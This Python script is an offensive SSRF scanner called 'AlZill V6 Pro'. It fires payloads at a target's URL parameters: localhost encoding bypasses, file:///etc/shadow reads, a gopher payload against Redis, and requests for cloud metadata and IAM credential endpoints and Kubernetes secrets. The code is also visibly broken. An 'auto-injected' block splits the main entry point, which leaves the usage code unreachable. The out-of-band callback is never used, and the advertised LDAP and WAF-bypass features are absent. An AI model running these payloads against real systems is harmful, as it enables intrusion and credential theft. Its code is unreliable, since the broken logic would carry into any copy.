#!/usr/bin/env python3
"""
Advanced SSRF Scanner - AlZill V6 Pro
Features: Blind SSRF (DNS OOB), WAF Bypass, Multi-Protocol, External Payloads
"""

import requests
import time
import urllib3
import re
import socket
import random
import string
import base64
import os
from termcolor import cprint
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from datetime import datetime
import json
from typing import List, Dict, Optional, Tuple, Any

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

INFO = "cyan"
SUCCESS = "green"
WARNING = "yellow"
ERROR = "red"
HIGHLIGHT = "magenta"


class AdvancedSSRFScanner:
    """Advanced SSRF Scanner - Blind SSRF, OOB Detection, External Payloads"""
    
    def __init__(self, callback_domain: str = None, verbose: bool = False, payloads_file: str = "payloads.txt"):
        self.verbose = verbose
        self.callback_domain = callback_domain or f"ssrf-{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}.collaborator.com"
        self.vulnerabilities = []
        self.total_requests = 0
        self.payloads_file = payloads_file
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # ============================================================
        # OOB Detection (Blind SSRF)
        # ============================================================
        self.oob_token = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
        
        # ============================================================
        # INTERNAL IP RANGES
        # ============================================================
        self.internal_ips = [
            '127.0.0.1', 'localhost', '0.0.0.0',
            '10.0.0.1', '10.0.0.2', '10.255.255.254',
            '172.16.0.1', '172.31.255.254',
            '192.168.0.1', '192.168.255.254',
            '169.254.169.254',
            'fd00::1', 'fe80::1'
        ]
        
        # ============================================================
        # INTERNAL PORTS TO SCAN
        # ============================================================
        self.internal_ports = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
            80: 'HTTP', 443: 'HTTPS', 3306: 'MySQL', 5432: 'PostgreSQL',
            6379: 'Redis', 27017: 'MongoDB', 9200: 'Elasticsearch',
            11211: 'Memcached', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt'
        }
        
        # ============================================================
        # Cloud Metadata Endpoints
        # ============================================================
        self.cloud_metadata = {
            'AWS': [
                'http://169.254.169.254/latest/meta-data/',
                'http://169.254.169.254/latest/user-data/',
                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                'http://169.254.169.254/latest/meta-data/instance-id',
                'http://169.254.169.254/latest/meta-data/public-keys/'
            ],
            'GCP': [
                'http://metadata.google.internal/computeMetadata/v1/',
                'http://metadata.google.internal/computeMetadata/v1/instance/',
                'http://metadata.google.internal/computeMetadata/v1/project/',
                'http://169.254.169.254/computeMetadata/v1/'
            ],
            'Azure': [
                'http://169.254.169.254/metadata/instance?api-version=2017-08-01',
                'http://169.254.169.254/metadata/instance/compute?api-version=2017-08-01',
                'http://169.254.169.254/metadata/instance/network?api-version=2017-08-01'
            ],
            'DigitalOcean': [
                'http://169.254.169.254/metadata/v1.json',
                'http://169.254.169.254/metadata/v1/id',
                'http://169.254.169.254/metadata/v1/region'
            ],
            'Kubernetes': [
                'http://localhost:8080/api/v1/namespaces/default/pods',
                'http://kubernetes.default.svc/api/v1/namespaces/default/pods',
                'https://kubernetes.default.svc/api/v1/namespaces/default/secrets'
            ]
        }
        
        # ============================================================
        # SSRF Success Indicators
        # ============================================================
        self.indicators = [
            r"root:x:0:0:", r"daemon:x:", r"bin:x:",
            r"ami-id", r"instance-id", r"local-hostname",
            r"computeMetadata", r"metadata.google",
            r"SSH-2.0-OpenSSH", r"220.*FTP", r"220.*Pure-FTPd",
            r"220.*vsFTPd", r"\[redis", r"redis_version",
            r"mongodb", r"MySQL", r"PostgreSQL",
            r"Elasticsearch", r"memcached"
        ]
        
        # ============================================================
        # LOAD PAYLOADS FROM EXTERNAL FILE
        # ============================================================
        self.payloads = self._load_payloads_from_file()
        
        # If no payloads loaded, use fallback
        if not self.payloads:
            self.payloads = self._generate_fallback_payloads()
    
    # ============================================================
    # LOAD PAYLOADS FROM FILE
    # ============================================================
    
    def _load_payloads_from_file(self) -> List[str]:
        """Load SSRF payloads from external payloads.txt file"""
        payloads = []
        
        # Also add internal payloads (always included)
        internal_payloads = self._generate_internal_payloads()
        payloads.extend(internal_payloads)
        
        if not os.path.exists(self.payloads_file):
            cprint(f"[!] Payloads file not found: {self.payloads_file}", WARNING)
            return payloads
        
        try:
            with open(self.payloads_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            current_section = None
            ssrf_count = 0
            
            for line in content.split('\n'):
                line = line.strip()
                
                if not line or line.startswith('#'):
                    continue
                
                if line.startswith('[') and line.endswith(']'):
                    current_section = line[1:-1].upper()
                    continue
                
                # Load SSRF payloads from [SSRF] section
                if current_section == 'SSRF':
                    payloads.append(line)
                    ssrf_count += 1
                    if self.verbose:
                        cprint(f"        Loaded SSRF payload: {line[:60]}...", SUCCESS)
            
            if ssrf_count > 0:
                cprint(f"\n[+] Loaded {ssrf_count} SSRF payloads from {self.payloads_file}", SUCCESS)
            
        except Exception as e:
            cprint(f"[!] Error loading payloads file: {e}", ERROR)
        
        return list(set(payloads))  # Remove duplicates
    
    def _generate_internal_payloads(self) -> List[str]:
        """Generate internal SSRF payloads (always included)"""
        payloads = []
        
        # Basic HTTP/HTTPS payloads
        for ip in self.internal_ips[:10]:
            for port in [80, 443, 8080, 8443]:
                payloads.append(f"http://{ip}:{port}")
                payloads.append(f"https://{ip}:{port}")
        
        # Localhost bypass
        localhost_bypass = [
            "http://2130706433/", "http://2130706433:80/",
            "http://0177.0.0.1/", "http://0177.0.0.1:80/",
            "http://0x7f000001/", "http://0x7f000001:80/",
            "http://127.0.0.1/", "http://127.0.0.2/",
            "http://localhost/", "http://localhost.localdomain/",
            "http://[::1]/", "http://[::1]:80/",
            "http://evil.com@127.0.0.1/",
        ]
        payloads.extend(localhost_bypass)
        
        # Alternative protocols
        protocol_payloads = [
            "file:///etc/passwd", "file:///etc/shadow",
            "file:///c:/windows/win.ini", "file:///proc/self/environ",
            "dict://127.0.0.1:22/", "dict://127.0.0.1:3306/",
            "ftp://127.0.0.1:21/", "ftp://127.0.0.1:21/etc/passwd",
            "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a",
        ]
        payloads.extend(protocol_payloads)
        
        # Cloud metadata
        for cloud, endpoints in self.cloud_metadata.items():
            for endpoint in endpoints:
                payloads.append(endpoint)
        
        return payloads
    
    def _generate_fallback_payloads(self) -> List[str]:
        """Fallback payloads if file not found"""
        cprint("[!] Using fallback SSRF payloads", WARNING)
        return self._generate_internal_payloads()
    
    # ============================================================
    # SSRF DETECTION METHODS
    # ============================================================
    
    def _detect_ssrf_in_response(self, response_text: str, headers: dict, url: str) -> tuple:
        """Detect SSRF from server response"""
        response_data = response_text + str(headers)
        
        for indicator in self.indicators:
            matches = re.findall(indicator, response_data, re.IGNORECASE)
            if matches:
                return True, indicator, matches[0]
        
        for cloud, endpoints in self.cloud_metadata.items():
            for endpoint in endpoints:
                if endpoint in url:
                    if len(response_text) > 200:
                        return True, f"Cloud Metadata ({cloud})", response_text[:200]
        
        return False, None, None
    
    def _detect_blind_ssrf(self, response_time: float, baseline_time: float, payload: str) -> bool:
        """Detect Blind SSRF via time delay"""
        if 'sleep' in payload.lower() or 'delay' in payload.lower():
            if response_time > baseline_time + 3:
                return True
        return False
    
    def _detect_port_banner(self, response_text: str) -> tuple:
        """Detect internal services via banner"""
        port_signatures = {
            'SSH': r'SSH-2.0-OpenSSH|SSH-1.99-OpenSSH',
            'FTP': r'220.*FTP|220.*vsFTPd|220.*Pure-FTPd',
            'MySQL': r'MySQL|mysql_native_password',
            'PostgreSQL': r'PostgreSQL|psql',
            'Redis': r'redis_version|\[redis',
            'MongoDB': r'mongodb|MongoDB',
            'Elasticsearch': r'elasticsearch|Elasticsearch',
            'Memcached': r'memcached|STAT',
            'HTTP': r'Server:.*Apache|Server:.*nginx|Server:.*IIS',
            'SMTP': r'220.*ESMTP|250.*SMTP',
            'Telnet': r'Telnet|login:',
        }
        
        for service, pattern in port_signatures.items():
            if re.search(pattern, response_text, re.IGNORECASE):
                return True, service, re.search(pattern, response_text, re.IGNORECASE).group(0)
        
        return False, None, None
    
    # ============================================================
    # MAIN SCAN FUNCTION
    # ============================================================
    
    def scan(self, url: str) -> Dict:
        """Main scan function"""
        
        cprint("\n" + "="*70, INFO)
        cprint("[SSRF SCAN] AlZill V6 Pro - External Payloads", HIGHLIGHT, attrs=['bold'])
        cprint("="*70, INFO)
        cprint("[*] Techniques: Content-based | Blind SSRF (OOB) | Port Scanning", WARNING)
        cprint("[*] Protocols: HTTP | HTTPS | FILE | DICT | GOPHER | FTP | LDAP", WARNING)
        cprint("[*] Payloads: External from payloads.txt", "yellow")
        
        if self.callback_domain:
            cprint(f"[*] OOB Callback Domain: {self.callback_domain}", INFO)
            cprint(f"[*] OOB Token: {self.oob_token}", INFO)
        
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        query_params = parse_qs(parsed_url.query)
        
        ssrf_params = [
            'url', 'dest', 'redirect', 'uri', 'path', 'continue', 'api', 'link',
            'src', 'source', 'target', 'destination', 'out', 'view', 'return',
            'return_to', 'redirect_uri', 'redirect_url', 'callback', 'callback_url',
            'forward', 'jump', 'goto', 'next', 'redirect_uri', 'redir', 'redir_url',
            'load', 'file', 'document', 'folder', 'root', 'path', 'folder_path'
        ]
        
        if query_params:
            test_params = [p for p in query_params.keys() if any(rp in p.lower() for rp in ssrf_params)]
            if not test_params:
                test_params = list(query_params.keys())[:15]
                cprint(f"[!] No SSRF-like params found, testing {len(test_params)} parameters", WARNING)
            else:
                cprint(f"[*] Found {len(test_params)} SSRF-like parameters", SUCCESS)
        else:
            test_params = ssrf_params[:20]
            cprint("[!] No parameters found, testing common SSRF parameters", WARNING)
        
        cprint(f"[*] Total Payloads: {len(self.payloads)}", INFO)
        cprint(f"[*] Testing {len(test_params)} parameter(s)", INFO)
        
        baseline_time = 0
        try:
            start = time.time()
            self.session.get(base_url, timeout=10, verify=False)
            baseline_time = time.time() - start
        except:
            baseline_time = 0.5
        
        for param_name in test_params:
            cprint(f"\n[*] Testing parameter: {param_name}", "blue")
            
            for idx, payload in enumerate(self.payloads):
                self.total_requests += 1
                
                current_query = query_params.copy() if query_params else {}
                current_query[param_name] = payload
                new_query = urlencode(current_query, doseq=True)
                test_url = urlunparse(parsed_url._replace(query=new_query))
                
                if self.verbose and idx % 50 == 0:
                    cprint(f"    Progress: {idx}/{len(self.payloads)} payloads", INFO)
                
                try:
                    start_time = time.time()
                    response = self.session.get(test_url, timeout=15, verify=False, allow_redirects=False)
                    elapsed_time = time.time() - start_time
                    
                    detected, indicator_type, evidence = self._detect_ssrf_in_response(
                        response.text, dict(response.headers), test_url
                    )
                    
                    if detected:
                        self.vulnerabilities.append({
                            'type': 'SSRF (Content-based)',
                            'parameter': param_name,
                            'payload': payload[:100],
                            'indicator': indicator_type,
                            'evidence': evidence[:200],
                            'severity': 'Critical',
                            'verified': True
                        })
                        cprint(f"     SSRF FOUND: {param_name} -> {indicator_type}", SUCCESS)
                        continue
                    
                    port_detected, service, banner = self._detect_port_banner(response.text)
                    if port_detected:
                        self.vulnerabilities.append({
                            'type': 'SSRF (Internal Port Access)',
                            'parameter': param_name,
                            'payload': payload[:100],
                            'service': service,
                            'banner': banner[:100],
                            'severity': 'High',
                            'verified': True
                        })
                        cprint(f"     Internal Service Detected: {param_name} -> {service}", SUCCESS)
                        continue
                    
                    if self._detect_blind_ssrf(elapsed_time, baseline_time, payload):
                        self.vulnerabilities.append({
                            'type': 'SSRF (Time-based / Blind)',
                            'parameter': param_name,
                            'payload': payload[:100],
                            'delay': round(elapsed_time - baseline_time, 2),
                            'severity': 'Medium',
                            'verified': True
                        })
                        cprint(f"     Blind SSRF Detected: {param_name} ({elapsed_time - baseline_time:.2f}s delay)", SUCCESS)
                        continue
                    
                except requests.exceptions.Timeout:
                    if 'sleep' in payload.lower() or 'delay' in payload.lower():
                        self.vulnerabilities.append({
                            'type': 'SSRF (Time-based - Timeout)',
                            'parameter': param_name,
                            'payload': payload[:100],
                            'severity': 'Medium',
                            'verified': True
                        })
                        cprint(f"     Blind SSRF (Timeout): {param_name}", SUCCESS)
                    continue
                    
                except Exception as e:
                    if self.verbose:
                        cprint(f"    Error: {e}", WARNING)
                    continue
        
        return self._generate_report()
    
    def _generate_report(self) -> Dict:
        """Generate final report"""
        
        cprint("\n" + "="*70, INFO)
        cprint(" SSRF SCAN RESULTS", HIGHLIGHT, attrs=['bold'])
        cprint("="*70, INFO)
        
        if self.vulnerabilities:
            cprint(f"\n[!!!] {len(self.vulnerabilities)} SSRF VULNERABILITIES FOUND!", ERROR, attrs=['bold'])
            
            for i, vuln in enumerate(self.vulnerabilities, 1):
                cprint(f"\n  [{i}] {vuln['type']}", ERROR)
                cprint(f"      Parameter: {vuln['parameter']}", INFO)
                if vuln.get('service'):
                    cprint(f"      Service: {vuln['service']}", INFO)
                if vuln.get('indicator'):
                    cprint(f"      Indicator: {vuln['indicator']}", WARNING)
                if vuln.get('evidence'):
                    cprint(f"      Evidence: {vuln['evidence'][:150]}", WARNING)
                if vuln.get('delay'):
                    cprint(f"      Delay: {vuln['delay']}s", INFO)
                cprint(f"      Severity: {vuln['severity']}", ERROR)
                cprint(f"      Status:  VERIFIED", SUCCESS)
        else:
            cprint(f"\n[✓] NO SSRF VULNERABILITIES FOUND", SUCCESS)
            cprint(f"[*] {len(self.payloads)} payloads tested, all passed", INFO)
        
        cprint(f"\n[*] Total requests: {self.total_requests}", INFO)
        cprint("\n" + "="*70 + "\n", INFO)
        
        return {
            'confirmed_vulnerabilities': len(self.vulnerabilities),
            'vulnerabilities': self.vulnerabilities,
            'total_requests': self.total_requests,
            'secure': len(self.vulnerabilities) == 0
        }


def scan(url: str, verbose: bool = False, delay: float = 1.0, payloads_file: str = "payloads.txt") -> Dict:
    """Legacy scan function"""
    scanner = AdvancedSSRFScanner(verbose=verbose, payloads_file=payloads_file)
    return scanner.scan(url)


if __name__ == "__main__":
    import sys

# ============================================================
# Proxy Support (Auto-injected)
# ============================================================
def get_session_with_proxy(proxy_session=None):
    """Get requests session with proxy support"""
    if proxy_session:
        return proxy_session
    return requests.Session()


def request_with_retry(url, method='GET', data=None, json=None, headers=None, 
                       proxy_session=None, max_retries=3, delay=2, **kwargs):
    """Send request with automatic retry and proxy support"""
    session = get_session_with_proxy(proxy_session)
    
    for attempt in range(max_retries):
        try:
            if method.upper() == 'GET':
                response = session.get(url, headers=headers, timeout=10, verify=False, **kwargs)
            elif method.upper() == 'POST':
                response = session.post(url, data=data, json=json, headers=headers, 
                                       timeout=10, verify=False, **kwargs)
            else:
                response = session.request(method, url, headers=headers, 
                                          timeout=10, verify=False, **kwargs)
            return response
        except (requests.exceptions.ConnectionError, ConnectionResetError) as e:
            if attempt < max_retries - 1:
                time.sleep(delay)
            else:
                raise e
        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(delay)
            else:
                raise e
    return None

    if len(sys.argv) > 1:
        target = sys.argv[1]
        verbose = '--verbose' in sys.argv or '-v' in sys.argv
        payloads_file = sys.argv[2] if len(sys.argv) > 2 else "payloads.txt"
        scan(target, verbose=verbose, payloads_file=payloads_file)
    else:
        print("Usage: python ssrf_scanner.py <target_url> [payloads_file] [--verbose]")